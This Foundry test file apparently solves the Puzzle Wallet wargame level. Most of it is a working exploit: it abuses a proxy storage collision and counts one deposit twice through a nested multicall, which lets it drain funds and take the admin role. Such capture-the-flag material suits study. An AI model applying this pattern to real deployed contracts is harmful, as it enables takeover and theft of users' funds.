// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Level24} from "../src/Level24.sol";


contract Level24Test is Test {
    address proxy=0xE005F019B047e2c3A69f8767bf68646B2B313821;

    function setUp() public {}
    // function test_Address() public{
    //     address bob=makeAddr("bob");
    //     console.log(bob,"bob");
    //     uint256 bob256=uint256(uint160(bytes20(bob)));
    //     address newBob=address(bytes20(uint160(bob256)));
    //     console.log(newBob,"newBob");
    // }

    function test_Elevator() public {
        address bob=makeAddr("bob");
        vm.deal(bob, 10 ether);
        vm.startPrank(bob);
        uint256 owner256=uint256(uint160(bytes20(bob)));
        (bool a,) = address(proxy).call(abi.encodeWithSignature("proposeNewAdmin(address)",bob));
         require(a);
        (bool b,) = address(proxy).call(abi.encodeWithSignature("addToWhitelist(address)",bob));
         require(b);
          bytes[] memory deposit=new bytes[](1);
         deposit[0]=abi.encodeWithSignature("deposit()");
         bytes memory data=abi.encodeWithSignature("multicall(bytes[])", deposit);
         bytes memory withdraw=abi.encodeWithSignature("execute(address,uint256,bytes)", bob,0.002 ether,"");
         bytes[] memory calls=new bytes[](3);
         calls[0]=data;
         calls[1]=data;
         calls[2]=withdraw;
        // (bool w,) = address(proxy).call(abi.encodeWithSignature("execute(address,uint256,bytes)",bob,0.002 ether,""));
        //  require(w);
         (bool c,) = address(proxy).call{value:0.001 ether}(abi.encodeWithSignature("multicall(bytes[])",calls));
         require(c);
         (bool d,) = address(proxy).call(abi.encodeWithSignature("setMaxBalance(uint256)",owner256));
         require(d);
        (, bytes memory ddd) = address(proxy).staticcall(abi.encodeWithSignature("admin()"));
        address admin = abi.decode(ddd, (address));
        vm.stopPrank();
        assertEq(admin, bob);

    }
}
